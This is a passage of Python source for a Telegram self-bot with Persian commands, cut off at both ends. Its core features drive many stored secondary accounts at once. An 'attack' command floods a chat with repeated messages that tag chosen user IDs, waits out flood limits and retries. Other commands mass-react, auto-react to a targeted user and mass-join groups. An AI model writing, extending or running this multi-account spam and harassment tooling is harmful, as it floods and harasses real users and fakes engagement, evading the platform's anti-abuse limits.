                                    ok = True
                                except Exception:
                                    try:
                                        t = msg.message or msg.text or ''
                                        await event.client.send_message(dest, "لینک | " + str(mid) + chr(10) + str(t))
                                        ok = True
                                    except Exception:
                                        pass
                            try:
                                await event.edit("ذخیره شد" if ok else "خطا در ذخیره")
                            except Exception:
                                pass
                        else:
                            try:
                                await event.edit("پیام پیدا نشد")
                            except Exception:
                                pass
                    except Exception as e:
                        try:
                            await event.edit("خطا: " + str(e)[:100])
                        except Exception:
                            pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return

            if text == '.محتوا':
                content_wait[uid] = {'step': 'key'}
                await event.edit("کلمه مورد نظرت رو بفرست")
                return

            if uid in content_wait:
                st = content_wait[uid]
                if st['step'] == 'key':
                    if not text:
                        return
                    st['key'] = text.lower().strip()
                    st['step'] = 'value'
                    try:
                        await event.edit("حالا پیامی که می‌خوای ذخیره بشه رو بفرست (متن/عکس/ویدیو/هر فرمت با بولد و نقل قول)")
                    except Exception:
                        pass
                    return
                if st['step'] == 'value':
                    key = st['key']
                    msg = event.message
                    raw = msg.text or msg.message or msg.raw_text or ''
                    if msg.media:
                        caption = msg.message or ''
                    else:
                        caption = raw
                    media_path = None
                    kind = 'text'
                    try:
                        if msg.media:
                            os.makedirs('content_media', exist_ok=True)
                            media_path = await event.client.download_media(
                                msg, file=os.path.join('content_media', f'{uid}_{key}_{int(msg.id)}')
                            )
                            if msg.photo: kind = 'photo'
                            elif msg.video: kind = 'video'
                            elif msg.voice: kind = 'voice'
                            elif msg.video_note: kind = 'video_note'
                            elif msg.sticker: kind = 'sticker'
                            elif getattr(msg, 'gif', None) or (msg.document and getattr(msg.document, 'mime_type', '') == 'image/gif'):
                                kind = 'gif'
                            elif msg.document: kind = 'document'
                            else: kind = 'media'
                    except Exception:
                        media_path = None
                    content_data = {
                        'text': caption if msg.media else raw,
                        'entities': entities_to_dict(msg.entities),
                        'entities_data': entities_to_data(msg.entities),
                        'media': media_path,
                        'kind': kind,
                    }
                    contents = get_ud(uid, 'contents', {})
                    contents[key] = content_data
                    set_user(uid, 'contents', contents)
                    del content_wait[uid]
                    try:
                        await event.edit(f"محتوا برای «{key}» ذخیره شد ({kind})")
                    except Exception:
                        pass
                    return

            if text == '.لیست محتوا':
                contents = get_ud(uid, 'contents', {})
                if not contents:
                    await event.edit("هیچ محتوایی ثبت نشده")
                    return
                parts = ["لیست محتوا"]
                for k in contents.keys():
                    parts.append("<blockquote><code>" + str(k).replace("<", "&lt;") + "</code></blockquote>")
                await event.edit(chr(10).join(parts), parse_mode='html')
                return

            if text.startswith('.حذف محتوا '):
                key = text[11:].strip().lower()
                contents = get_ud(uid, 'contents', {})
                if key in contents:
                    del contents[key]
                    set_user(uid, 'contents', contents)
                    await event.edit(f"محتوای «{key}» حذف شد")
                else:
                    await event.edit("این محتوا وجود ندارد")
                return

            # .توقف / .stop — قطع اسپم سلف و اتک اکانت‌های اضافه
            if text.strip().lower() in ('.توقف', 'توقف', '.stop', 'stop', '.متوقف', 'متوقف') or text_norm.strip().lower() in ('.توقف', 'توقف', '.stop', 'stop', '.متوقف', 'متوقف'):
                spam_cancel[uid] = True
                job = extra_attack_jobs.get(uid)
                if job:
                    job['active'] = False
                for k, j in list(extra_spam_jobs.items()):
                    try:
                        if (isinstance(k, tuple) and k and int(k[0]) == int(uid)) or k == uid:
                            if isinstance(j, dict):
                                j['active'] = False
                    except Exception:
                        pass
                extra_attack_jobs.pop(uid, None)
                try:
                    await event.edit("Attack stopped")
                except Exception:
                    try:
                        await event.reply("Attack stopped")
                    except Exception:
                        pass
                return

            # .امار @username
            if (text.startswith('.امار @') or text_norm.startswith('.امار @') or
                    (text.startswith('.امار ') and '@' in text)):
                import re as _re
                m = _re.search(r'@([A-Za-z0-9_]{4,})', text)
                if not m:
                    try:
                        await event.edit("یوزرنیم معتبر بفرست\nمثال: .امار @username")
                    except Exception:
                        pass
                    return
                uname = m.group(1)
                try:
                    await event.edit("در حال دریافت...")
                except Exception:
                    pass
                try:
                    ent = await event.client.get_entity(uname)
                    tid = ent.id
                    name = await resolve_name(event.client, tid)
                    un = getattr(ent, 'username', None)
                    bio = ""
                    try:
                        from telethon.tl.functions.users import GetFullUserRequest
                        fu = await event.client(GetFullUserRequest(ent))
                        bio = getattr(fu.full_user, 'about', None) or ""
                    except Exception:
                        pass
                    body = (
                        "مشخصات کاربر" + chr(10)
                        + "نام: " + str(name) + chr(10)
                        + "یوزرنیم: " + (("@" + un) if un else "ندارد") + chr(10)
                        + "ایدی: `" + str(tid) + "`" + chr(10)
                        + "بیو: " + (bio or "ندارد")
                    )
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    sent = False
                    try:
                        photos = await event.client.get_profile_photos(ent, limit=1)
                        if photos:
                            await event.client.send_file('me', photos[0], caption=body, parse_mode='Markdown')
                            sent = True
                    except Exception:
                        pass
                    if not sent:
                        await event.client.send_message('me', body, parse_mode='Markdown')
                except Exception as e:
                    try:
                        await event.edit("پیدا نشد: " + str(e)[:80])
                    except Exception:
                        pass
                return

            # .تنظیم متن دقیقه — ارسال دوره‌ای
            if _ts.startswith('.تنظیم ') or _tn.startswith('.تنظیم '):
                raw = _ts[len('.تنظیم '):].strip() if _ts.startswith('.تنظیم ') else _tn[len('.تنظیم '):].strip()
                # دشمن / کل / بنر / سلام خودکار نه
                if raw.startswith('دشمن') or raw.startswith('کل') or raw.startswith('بنر') or raw.startswith('متن'):
                    pass
                else:
                    parts = raw.rsplit(None, 1)
                    if len(parts) == 2 and _re_pri.sub(r'[^0-9]', '', to_en_digits(parts[1])):
                        txt = parts[0].strip()
                        try:
                            mins = int(to_en_digits(_re_pri.sub(r'[^0-9]', '', parts[1])))
                        except Exception:
                            mins = 0
                        if mins < 1:
                            try:
                                await event.edit("دقیقه نامعتبر")
                            except Exception:
                                pass
                            await asyncio.sleep(1.5)
                            try:
                                await event.delete()
                            except Exception:
                                pass
                            return
                        if not txt:
                            try:
                                await event.edit("متن خالی")
                            except Exception:
                                pass
                            return
                        import time as _tset
                        jobs = interval_jobs.get(uid) or []
                        jobs.append({
                            'chat_id': event.chat_id,
                            'text': txt,
                            'interval': mins * 60,
                            'next_ts': _tset.time() + mins * 60,
                        })
                        interval_jobs[uid] = jobs
                        # یک‌بار همین الان
                        try:
                            await event.client.send_message(event.chat_id, txt)
                        except Exception:
                            pass
                        try:
                            await event.edit("هر " + str(mins) + " دقیقه تنظیم شد")
                        except Exception:
                            pass
                        await asyncio.sleep(1.5)
                        try:
                            await event.delete()
                        except Exception:
                            pass
                        return


            # .اتک متن تعداد [ایدی کاراکتر]
            _atk_s = (text or '').strip()
            _atk_n = (text_norm or '').strip()
            _atk_ok = False
            for _src in (_atk_s, _atk_n):
                if __import__('re').match(r'^[.．٫/]\s*اتک\s+', _src):
                    _atk_ok = True
                    _atk_body = __import__('re').sub(r'^[.．٫/]\s*اتک\s+', '', _src, count=1).strip()
                    break
            if _atk_ok:
                import re as _re
                extras = get_extras(uid) or {}
                acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                if not acc_ids:
                    try:
                        await event.edit("اکانتی اضافه نکردی")
                        await asyncio.sleep(2)
                        await event.delete()
                    except Exception:
                        pass
                    return
                tokens = [to_en_digits(t) for t in _atk_body.split()]
                count_idx = None
                for i in range(len(tokens) - 1, -1, -1):
                    if tokens[i].isdigit() and 1 <= len(tokens[i]) <= 8:
                        count_idx = i
                        break
                if count_idx is None:
                    try:
                        await event.edit("مثال:\n.اتک سلام 100\n.اتک سلام 50 8434222801 𒀖")
                    except Exception:
                        pass
                    return
                count = int(tokens[count_idx])
                if count < 1:
                    try:
                        await event.edit("تعداد نامعتبر")
                    except Exception:
                        pass
                    return
                spam_text = " ".join(tokens[:count_idx]).strip() or " "
                after = tokens[count_idx + 1:]
                ids = [int(t) for t in after if t.isdigit() and len(t) >= 5]
                chars = [t for t in after if not t.isdigit()]
                def build_body():
                    body = spam_text
                    if ids:
                        use_chars = chars if chars else ["."]
                        parts = []
                        for i, tid in enumerate(ids):
                            ch = use_chars[i] if i < len(use_chars) else use_chars[-1]
                            parts.append("[" + ch + "](tg://user?id=" + str(tid) + ")")
                        body = (spam_text + " " if spam_text else "") + " ".join(parts)
                    return body
                body0 = build_body()
                reply_to = None
                try:
                    if event.is_reply:
                        rep = await event.get_reply_message()
                        if rep:
                            reply_to = rep.id
                except Exception:
                    reply_to = None
                extra_attack_jobs[uid] = {
                    'active': True,
                    'count': count,
                    'sent': 0,
                    'text': body0,
                    'chat_id': event.chat_id,
                    'parse': 'Markdown' if ids else None,
                    'reply_to': reply_to,
                }
                spam_cancel[uid] = False
                try:
                    await event.edit("اتک\n<code>.متوقف</code>", parse_mode='HTML')
                except Exception:
                    try:
                        await event.edit("اتک\n`.متوقف`", parse_mode='Markdown')
                    except Exception:
                        pass

                async def _run_attack():
                    job = extra_attack_jobs.get(uid)
                    if not job:
                        return
                    chat_id = job['chat_id']
                    body = job['text']
                    rto = job.get('reply_to')
                    need = int(job['count'])
                    try:
                        dly = float(get_ud(uid, 'extra_spam_delay', 0) or 0)
                    except Exception:
                        dly = 0
                    if dly <= 0:
                        dly = 0.01

                    async def _one_acc(aid):
                        sent_local = 0
                        fails = 0
                        try:
                            key = (int(uid), int(aid))
                            cl = extra_clients.get(key)
                            if not cl:
                                inf = extras.get(str(aid)) or extras.get(aid) or {}
                                sess = inf.get('session')
                                if sess:
                                    await start_extra_client(uid, aid, sess)
                                    cl = extra_clients.get(key)
                            if not cl:
                                return
                            attempts = 0
                            max_attempts = max(need * 8, need + 20)
                            while sent_local < need and attempts < max_attempts:
                                attempts += 1
                                job2 = extra_attack_jobs.get(uid)
                                if not job2 or not job2.get('active') or spam_cancel.get(uid):
                                    break
                                try:
                                    kw = {}
                                    if rto:
                                        kw['reply_to'] = rto
                                    if job.get('parse'):
                                        kw['parse_mode'] = 'Markdown'
                                    await cl.send_message(chat_id, body, **kw)
                                    sent_local += 1
                                    fails = 0
                                    job2['sent'] = int(job2.get('sent') or 0) + 1
                                    await asyncio.sleep(dly)
                                except FloodWaitError as fw:
                                    await asyncio.sleep(min(30, int(getattr(fw, 'seconds', 3)) + 1))
                                    continue
                                except Exception:
                                    fails += 1
                                    if fails >= 15:
                                        break
                                    await asyncio.sleep(0.08)
                                    continue
                        except Exception:
                            pass

                    try:
                        await asyncio.gather(*[_one_acc(a) for a in acc_ids], return_exceptions=True)
                    except Exception:
                        for a in acc_ids:
                            try:
                                await _one_acc(a)
                            except Exception:
                                pass
                    extra_attack_jobs.pop(uid, None)
                try:
                    asyncio.get_event_loop().create_task(_run_attack())
                except Exception:
                    asyncio.create_task(_run_attack())
                return

            # .list acc — لیست اکانت‌های اضافه
            if text.strip().lower() in ('.list acc', '.listacc') or text_norm.strip().lower() in ('.list acc', '.listacc'):
                extras = get_extras(uid) or {}
                lines = ["list acc ↓"]
                for aid, inf in extras.items():
                    if str(aid).lower() in ('all', 'none', '') or not isinstance(inf, dict):
                        continue
                    nm = inf.get('name') or '—'
                    un = inf.get('username')
                    eid = inf.get('id') or aid
                    line = str(nm) + " <code>" + str(eid) + "</code>"
                    if un:
                        line += " @" + str(un).lstrip('@')
                    lines.append("<blockquote>" + line + "</blockquote>")
                if len(lines) == 1:
                    lines.append("<blockquote>اکانتی اضافه نکردی</blockquote>")
                try:
                    await event.edit("\n".join(lines), parse_mode='HTML')
                except Exception:
                    try:
                        await event.reply("\n".join(lines), parse_mode='HTML')
                    except Exception:
                        pass
                return

            # .ری اکت 10 🤣  یا .ری اکت 10 رندوم  (ریپلای روی پیام)
            if (text.startswith('.ری اکت ') or text_norm.startswith('.ری اکت ')) and not text.startswith('.ری اکت خودکار') and not text.startswith('.ری اکت اتک') and not text.startswith('.ری اکت رندوم') and not text.startswith('.ری اکت خاموش') and __import__('re').search(r'\d+', text):
                if not event.is_reply:
                    try:
                        await event.edit("روی پیام ریپلای کن")
                    except Exception:
                        pass
                    return
                # پارس: .ری اکت 10 🤣  یا .ری اکت 5 رندوم
                import re as _re
                rest = text[8:].strip() if text.startswith('.ری اکت ') else text_norm[8:].strip()
                count = None
                emo = None
                is_rand = False
                mnum = _re.search(r'(\d+)', rest)
                if mnum:
                    count = int(mnum.group(1))
                    rest2 = (rest[:mnum.start()] + ' ' + rest[mnum.end():]).strip()
                else:
                    rest2 = rest
                if 'رندوم' in rest2 or 'random' in rest2.lower():
                    is_rand = True
                    rest2 = rest2.replace('رندوم', '').replace('random', '').replace('Random', '').strip()
                if not is_rand and rest2:
                    emo = rest2.split()[0] if rest2.split() else rest2
                if count is None:
                    # بدون عدد → قفل ری‌اکت عادی (هندلر پایین)
                    pass
                else:
                    extras = get_extras(uid) or {}
                    acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                    if not acc_ids:
                        try:
                            await event.edit("اکانت اضافه‌ای ثبت نشده")
                        except Exception:
                            pass
                        return
                    if count > len(acc_ids):
                        try:
                            await event.edit(
                                "تعداد اکانت هات کافی نیست\nاکانت های شما : " + str(len(acc_ids))
                            )
                            await asyncio.sleep(2)
                            await event.delete()
                        except Exception:
                            pass
                        return
                    if not is_rand and not emo:
                        try:
                            await event.edit("ایموجی ری‌اکت را بنویس یا رندوم")
                        except Exception:
                            pass
                        return
                    rep = await event.get_reply_message()
                    mid = rep.id
                    chat_id = event.chat_id
                    rand_pool = ['👍', '❤', '❤️', '🔥', '😂', '👏', '😍', '🎉', '💯', '⚡', '🤝', '🤣', '😊', '😎', '🤔', '😢', '😁', '🤗']
                    used = acc_ids[:count]
                    ok_n = 0
                    for i, aid in enumerate(used):
                        try:
                            key = (int(uid), int(aid))
                            cl = extra_clients.get(key)
                            if not cl:
                                inf = extras.get(str(aid)) or extras.get(aid) or {}
                                sess = inf.get('session')
                                if sess:
                                    await start_extra_client(uid, aid, sess)
                                    cl = extra_clients.get(key)
                            if not cl:
                                continue
                            e2 = random.choice(rand_pool) if is_rand else emo
                            done = False
                            # روش ۱: react روی خود پیام
                            try:
                                msgs = await cl.get_messages(chat_id, ids=mid)
                                if msgs:
                                    try:
                                        await msgs.react(e2)
                                        done = True
                                    except Exception:
                                        pass
                            except Exception:
                                pass
                            # روش ۲: SendReactionRequest با peerهای مختلف
                            if not done:
                                peers = []
                                try:
                                    peers.append(await cl.get_input_entity(chat_id))
                                except Exception:
                                    pass
                                peers.append(chat_id)
                                em_list = [e2]
                                if not is_rand:
                                    em_list += [e2.replace('\ufe0f', ''), e2 + '\ufe0f']
                                for peer in peers:
                                    for em_try in em_list:
                                        try:
                                            await cl(SendReactionRequest(
                                                peer=peer,
                                                msg_id=mid,
                                                reaction=[ReactionEmoji(emoticon=em_try)],
                                            ))
                                            done = True
                                            break
                                        except Exception:
                                            continue
                                    if done:
                                        break
                            if done:
                                ok_n += 1
                        except Exception:
                            continue
                    if ok_n == 0:
                        try:
                            await event.edit("این ری اکت باز نیست یا اکانت‌ها عضو گروه نیستند")
                            await asyncio.sleep(2)
                            await event.delete()
                        except Exception:
                            pass
                        return
                    label = "رندوم" if is_rand else str(emo)
                    try:
                        await event.edit(str(ok_n) + " " + label + " رو پیامش زده شد")
                    except Exception:
                        pass
                    return

            # .ری اکت خودکار 10 🤣  یا رندوم — روی کاربر ریپلای‌شده
            if text.startswith('.ری اکت خودکار ') or text_norm.startswith('.ری اکت خودکار '):
                if not event.is_reply:
                    try:
                        await event.edit("روی پیام کاربر ریپلای کن")
                    except Exception:
                        pass
                    return
                parts = text.split()
                count = None
                emo = None
                is_rand = False
                for p in parts[3:]:
                    if p.isdigit() and count is None:
                        count = int(p)
                    elif p in ('رندوم', 'random'):
                        is_rand = True
                    else:
                        emo = p
                if count is None:
                    try:
                        await event.edit("مثال:\n.ری اکت خودکار 10 🤣\n.ری اکت خودکار 5 رندوم")
                    except Exception:
                        pass
                    return
                extras = get_extras(uid) or {}
                acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                if count > len(acc_ids):
                    try:
                        await event.edit(
                            "تعداد اکانت هات کافی نیست\nاکانت های شما : " + str(len(acc_ids))
                        )
                        await asyncio.sleep(2)
                        await event.delete()
                    except Exception:
                        pass
                    return
                rep = await event.get_reply_message()
                tid = await get_real_sender(rep)
                if not tid:
                    try:
                        await event.edit("کاربر پیدا نشد")
                    except Exception:
                        pass
                    return
                name = await resolve_name(event.client, tid)
                auto_react_jobs[(uid, int(tid))] = {
                    'count': count,
                    'emoji': emo,
                    'random': is_rand,
                    'chat_id': event.chat_id,
                }
                label = "رندوم" if is_rand else str(emo)
                try:
                    await event.edit(
                        str(count) + " ری اکت " + label + " به " + mention(tid, name),
                        parse_mode='Markdown',
                    )
                except Exception:
                    pass
                return

            # .set — جوین همه اکانت‌های اضافه به همین گروه
            if text.strip() in ('.set', '.SET', 'set') or text_norm.strip() in ('.set', '.SET'):
                if not event.is_group:
                    try:
                        await event.edit("فقط تو گروه")
                    except Exception:
                        pass
                    return
                extras = get_extras(uid) or {}
                acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                if not acc_ids:
                    try:
                        await event.edit("اکانت اضافه‌ای ثبت نشده")
                    except Exception:
                        pass
                    return
                try:
                    await event.edit("joining")
                except Exception:
                    pass
                chat_id = event.chat_id
                join_link = None
                join_username = None
                access_hash = None
                channel_id = None
                try:
                    chat = await event.get_chat()
                    join_username = getattr(chat, 'username', None)
                    access_hash = getattr(chat, 'access_hash', None)
                    channel_id = getattr(chat, 'id', None)
                except Exception:
                    chat = None
                # همیشه لینک دعوت تازه بگیر (حتی اگر username باشد — برای درخواست عضویت)
                try:
                    from telethon.tl.functions.messages import ExportChatInviteRequest
                    inv = await event.client(ExportChatInviteRequest(peer=chat_id))
                    join_link = getattr(inv, 'link', None) or getattr(inv, 'url', None) or str(inv)
                except Exception:
                    try:
                        from telethon.tl.functions.messages import ExportChatInviteRequest
                        inv = await event.client(ExportChatInviteRequest(chat_id))
                        join_link = getattr(inv, 'link', None) or str(inv)
                    except Exception:
                        join_link = join_link
                phrase = get_ud(uid, 'extra_join_text', None) or "Server : on"
                # ذخیره لینک/ایدی این گپ برای اتک‌های بعدی بدون .set دوباره
                try:
                    inv_map = get_ud(uid, 'extra_group_invites', {}) or {}
                    if not isinstance(inv_map, dict):
                        inv_map = {}
                    inv_map[str(chat_id)] = {
                        'link': join_link,
                        'username': join_username,
                        'access_hash': access_hash,
                        'channel_id': channel_id,
                    }
                    set_user(uid, 'extra_group_invites', inv_map)
                except Exception:
                    pass
                from telethon.tl.functions.messages import ImportChatInviteRequest
                from telethon.tl.functions.channels import JoinChannelRequest
                from telethon.tl.types import InputChannel, InputPeerChannel

                async def _ensure_cl(aid):
                    key = (int(uid), int(aid))
                    cl = extra_clients.get(key)
                    if cl:
                        try:
                            if not cl.is_connected():
                                await cl.connect()
                        except Exception:
                            cl = None
                    if not cl:
                        inf = extras.get(str(aid)) or extras.get(aid) or {}
                        sess = inf.get('session')
                        if sess:
                            try:
                                await start_extra_client(uid, aid, sess)
                            except Exception:
                                pass
                            cl = extra_clients.get(key)
                    return cl

                async def _join_one(aid):
                    try:
                        cl = await _ensure_cl(aid)
                        if not cl:
                            return False
                        okj = False
                        # 1) invite link — کار برای خصوصی و درخواست عضویت
                        if join_link:
                            hp = str(join_link)
                            for pref in ('https://t.me/+', 'http://t.me/+', 'https://t.me/joinchat/', 'http://t.me/joinchat/', 't.me/+', 't.me/joinchat/'):
                                hp = hp.replace(pref, '')
                            hp = hp.strip().split('/')[-1].split('?')[0]
                            if hp:
                                try:
                                    await cl(ImportChatInviteRequest(hp))
                                    okj = True
                                except Exception as e:
                                    el = str(e).lower()
                                    if any(x in el for x in ('already', 'participant', 'successfully', 'invite_request_sent', 'request')):
                                        okj = True
                        # 2) username
                        if not okj and join_username:
                            try:
                                await cl(JoinChannelRequest(join_username))
                                okj = True
                            except Exception as e:
                                el = str(e).lower()
                                if 'already' in el or 'participant' in el:
                                    okj = True
                                else:
                                    try:
                                        ent = await cl.get_entity(join_username)
                                        await cl(JoinChannelRequest(ent))
                                        okj = True
                                    except Exception as e2:
                                        if 'already' in str(e2).lower():
                                            okj = True
                        # 3) InputChannel با access_hash از اکانت صاحب
                        if not okj and access_hash is not None and channel_id is not None:
                            try:
                                # channel_id در تلگرام ممکن است -100 داشته باشد
                                cid = int(channel_id)
                                if cid < 0:
                                    cid = int(str(cid).replace('-100', '').replace('-', ''))
                                ic = InputChannel(cid, int(access_hash))
                                await cl(JoinChannelRequest(ic))
                                okj = True
                            except Exception as e:
                                if 'already' in str(e).lower():
                                    okj = True
                        # 4) entity از ایدی عددی چت
                        if not okj:
                            try:
                                ent = await event.client.get_entity(chat_id)
                                try:
                                    await cl(JoinChannelRequest(ent))
                                    okj = True
                                except Exception:
                                    # کپی peer
                                    try:
                                        p = await event.client.get_input_entity(chat_id)
                                        await cl(JoinChannelRequest(p))
                                        okj = True
                                    except Exception as e3:
                                        if 'already' in str(e3).lower():
                                            okj = True
                            except Exception:
                                pass
                        if not okj:
                            return False
                        # پیام جوین فقط یک‌بار در این گپ
                        try:
                            store = get_ud(uid, 'extra_join_msgs', {}) or {}
                            if not isinstance(store, dict):
                                store = {}
                            ckey = str(chat_id)
                            if ckey not in store or not isinstance(store.get(ckey), dict):
                                store[ckey] = {}
                            old_mid = store[ckey].get(str(aid))
                            if old_mid:
                                try:
                                    await cl.delete_messages(chat_id, int(old_mid))
                                except Exception:
                                    pass
                            m = await cl.send_message(chat_id, str(phrase))
                            store[ckey][str(aid)] = m.id
                            set_user(uid, 'extra_join_msgs', store)
                        except Exception:
                            pass
                        # کلیک دکمه عضویت اجباری اگر بود
                        try:
                            await asyncio.sleep(0.8)
                            async for msg in cl.iter_messages(chat_id, limit=5):
                                if msg.reply_markup:
                                    try:
                                        for row in msg.reply_markup.rows:
                                            for btn in row.buttons:
                                                if getattr(btn, 'url', None):
                                                    continue
                                                try:
                                                    await msg.click(0)
                                                    break
                                                except Exception:
                                                    pass
                                    except Exception:
                                        pass
                                    break
                        except Exception:
                            pass
                        return True
                    except Exception:
                        return False

                results = await asyncio.gather(*[_join_one(a) for a in acc_ids], return_exceptions=True)
                okc = sum(1 for r in results if r is True)
                try:
                    await event.edit("joining : " + str(okc) + "/" + str(len(acc_ids)))
                except Exception:
                    pass
                return

            if text.strip() in ('.leave', '.LEAVE', '.لفت') or text_norm.strip() in ('.leave', '.لفت'):
                if not event.is_group:
                    try:
                        await event.edit("فقط تو گروه")
                    except Exception:
                        pass
                    return
                extras = get_extras(uid) or {}
                acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                if not acc_ids:
                    try:
                        await event.edit("اکانتی اضافه نکردی")
                        await asyncio.sleep(2)
                        await event.delete()
                    except Exception:
                        pass
                    return
                try:
                    await event.edit("leaving")
                except Exception:
                    pass
                chat_id = event.chat_id
                from telethon.tl.functions.channels import LeaveChannelRequest

                async def _leave_one(aid):
                    try:
                        key = (int(uid), int(aid))
                        cl = extra_clients.get(key)
                        if not cl:
                            inf = extras.get(str(aid)) or extras.get(aid) or {}
                            sess = inf.get('session')
                            if sess:
                                try:
                                    await start_extra_client(uid, aid, sess)
                                except Exception:
                                    pass
                                cl = extra_clients.get(key)
                        if cl:
                            try:
                                if not cl.is_connected():
                                    await cl.connect()
                            except Exception:
                                # سشن را از نو
                                try:
                                    inf = extras.get(str(aid)) or extras.get(aid) or {}
                                    sess = inf.get('session')
                                    if sess:
                                        await start_extra_client(uid, aid, sess)
                                        cl = extra_clients.get(key)
                                except Exception:
                                    pass
                        if not cl:
                            return False
                        left = False
                        # چند روش لفت
                        try:
                            ent = await cl.get_entity(chat_id)
                            await cl(LeaveChannelRequest(ent))
                            left = True
                        except Exception:
                            pass
                        if not left:
                            try:
                                await cl.kick_participant(chat_id, 'me')
                                left = True
                            except Exception:
                                pass
                        if not left:
                            try:
                                await cl.delete_dialog(chat_id)
                                left = True
                            except Exception:
                                pass
                        return left
                    except Exception:
                        return False

                try:
                    await asyncio.gather(*[_leave_one(a) for a in acc_ids], return_exceptions=True)
                except Exception:
                    for a in acc_ids:
                        try:
                            await _leave_one(a)
                        except Exception:
                            pass
                # پیام «در حال لفت دادن...» حذف نشود
                return

            # جوین همه اکانت‌های اضافه با ریپلای روی لینک
            if text.strip() in ('.جوین', 'جوین') or text_norm.strip() in ('.جوین', 'جوین'):
                if not event.is_reply:
                    try:
                        await event.edit("روی پیام لینک دعوت ریپلای کن")
                    except Exception:
                        pass
                    return
                rep = await event.get_reply_message()
                link = (rep.message or rep.text or '').strip()
                import re as _re
                m = _re.search(r'(https?://t\.me/\S+|t\.me/\S+|\+[A-Za-z0-9_-]+)', link)
                if not m:
                    # کل متن به‌عنوان لینک
                    if 't.me/' not in link and 'joinchat' not in link and not link.startswith('+'):
                        try:
                            await event.edit("لینک دعوت پیدا نشد")
                        except Exception:
                            pass
                        return
                join_link = m.group(1) if m else link
                extras = get_extras(uid) or {}
                acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                if not acc_ids:
                    try:
                        await event.edit("اکانت اضافه‌ای نیست")
                    except Exception:
                        pass
                    return
                try:
                    await event.edit("joining : 0")
                except Exception:
                    pass
                done = 0
                from telethon.tl.functions.messages import ImportChatInviteRequest
                from telethon.tl.functions.channels import JoinChannelRequest
                for aid in acc_ids:
                    try:
                        key = (int(uid), int(aid))
                        cl = extra_clients.get(key)
                        if not cl:
                            inf = extras.get(str(aid)) or extras.get(aid) or {}
                            sess = inf.get('session')
                            if sess:
                                await start_extra_client(uid, aid, sess)
                                cl = extra_clients.get(key)
                        if not cl:
                            continue
                        if 'joinchat/' in join_link or '/+' in join_link or join_link.startswith('+'):
                            hash_part = join_link.split('+')[-1].split('/')[-1].replace('joinchat/', '')
                            try:
                                await cl(ImportChatInviteRequest(hash_part))
                            except Exception:
                                await cl(ImportChatInviteRequest(join_link.split('/')[-1]))
                        else:
                            # public
                            un = join_link.rstrip('/').split('/')[-1]
                            await cl(JoinChannelRequest(un))
                        done += 1
                        try:
                            await event.edit("joining : " + str(done))
                        except Exception:
                            pass
                    except Exception:
                        continue
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            # Silence commands


            # میو / پیشی / ماهی خودکار
            async def _group_label(ev):
                try:
                    chat = await ev.get_chat()
                    title = getattr(chat, 'title', None) or getattr(chat, 'username', None) or str(ev.chat_id)
                    return str(title)
                except Exception:
                    return str(ev.chat_id)

            if text in ('.میو خودکار روشن', '.میو خودکار') or text_norm in ('.میو خودکار روشن', '.میو خودکار') or text.startswith('.میو خودکار روشن'):
                import re as _re
                import time as _t
                m = _re.search(r'(\d+)', text)
                interval = int(m.group(1)) if m else 6
                if interval < 1:
                    interval = 1
                gname = await _group_label(event)
                meow_chats[uid] = {
                    'chat_id': event.chat_id,
                    'interval': interval,
                    'next_ts': _t.time() + interval * 60,
                }
                try:
                    await event.edit(f"میو خودکار در {gname} روشن شد")
                except Exception:
                    try:
                        await event.reply(f"میو خودکار در {gname} روشن شد")
                    except Exception:
                        pass
                # یک‌بار الان
                try:
                    await event.client.send_message(event.chat_id, "میو")
                except Exception:
                    pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if text in ('.میو خودکار خاموش',) or text_norm in ('.میو خودکار خاموش',):
                gname = await _group_label(event)
                meow_chats.pop(uid, None)
                try:
                    await event.edit(f"میو خودکار در {gname} خاموش شد")
                except Exception:
                    try:
                        await event.reply(f"میو خودکار در {gname} خاموش شد")
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if text.startswith('.پیشی خودکار روشن') or text_norm.startswith('.پیشی خودکار روشن'):
                import re as _re
                import time as _t
                m = _re.search(r'(\d+)', text)
                interval = int(m.group(1)) if m else 30
                if interval < 1:
                    interval = 1
                gname = await _group_label(event)
                pishi_jobs[uid] = {
                    'chat_id': event.chat_id,
                    'interval': interval,
                    'next_ts': _t.time() + interval * 60,
                }
                try:
                    await event.edit(f"پیشی خودکار در {gname} روشن شد")
                except Exception:
                    try:
                        await event.reply(f"پیشی خودکار در {gname} روشن شد")
                    except Exception:
                        pass
                try:
                    await send_word_and_click(event.client, event.chat_id, 'پیشی', btn_index=0, require_reply=True, min_buttons=1)
                except Exception:
                    try:
                        await event.client.send_message(event.chat_id, "پیشی")
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if text in ('.پیشی خودکار خاموش',) or text_norm in ('.پیشی خودکار خاموش',):
                gname = await _group_label(event)
                pishi_jobs.pop(uid, None)
                try:
                    await event.edit(f"پیشی خودکار در {gname} خاموش شد")
                except Exception:
                    try:
                        await event.reply(f"پیشی خودکار در {gname} خاموش شد")
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            if text.startswith('.ماهی گیری خودکار روشن') or text_norm.startswith('.ماهی گیری خودکار روشن') or text.startswith('.ماهی‌گیری خودکار روشن') or text_norm.startswith('.ماهی‌گیری خودکار روشن'):
                import re as _re
                import time as _t
                m = _re.search(r'(\d+)', text)
                interval = int(m.group(1)) if m else 60
                if interval < 1:
                    interval = 1
                gname = await _group_label(event)
                fish_jobs[uid] = {
                    'chat_id': event.chat_id,
                    'interval': interval,
                    'next_ts': _t.time() + interval * 60,
                    'turn': 0,
                }
                try:
                    await event.edit(f"ماهی گیری خودکار در {gname} روشن شد")
                except Exception:
                    try:
                        await event.reply(f"ماهی گیری خودکار در {gname} روشن شد")
                    except Exception:
                        pass
                try:
                    # اولین بار دکمه اول
